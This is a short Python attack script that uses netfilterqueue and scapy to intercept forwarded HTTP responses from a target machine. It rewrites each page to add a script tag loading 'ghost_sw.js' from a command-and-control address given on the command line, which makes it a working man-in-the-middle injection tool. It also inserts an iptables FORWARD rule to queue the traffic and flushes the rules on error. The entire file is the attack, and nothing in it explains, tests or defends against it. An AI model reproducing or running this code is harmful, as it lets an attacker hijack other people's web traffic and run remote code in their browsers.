import os, sys
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

TARGET_IP = sys.argv[1]
C2_IP = sys.argv[2]
PAYLOAD = f"<script src='http://{C2_IP}:8080/ghost_sw.js'></script></body>".encode()

def callback(pkt):
    scapy_pkt = IP(pkt.get_payload())
    if scapy_pkt.src == TARGET_IP and scapy_pkt.haslayer(Raw) and scapy_pkt[TCP].sport == 80:
        if b"</body>" in scapy_pkt[Raw].load:
            scapy_pkt[Raw].load = scapy_pkt[Raw].load.replace(b"</body>", PAYLOAD)
            del scapy_pkt[IP].len; del scapy_pkt[IP].chksum; del scapy_pkt[TCP].chksum
            pkt.set_payload(bytes(scapy_pkt))
    pkt.accept()

os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
nfq = NetfilterQueue()
nfq.bind(1, callback)
try: nfq.run()
except: os.system("iptables --flush")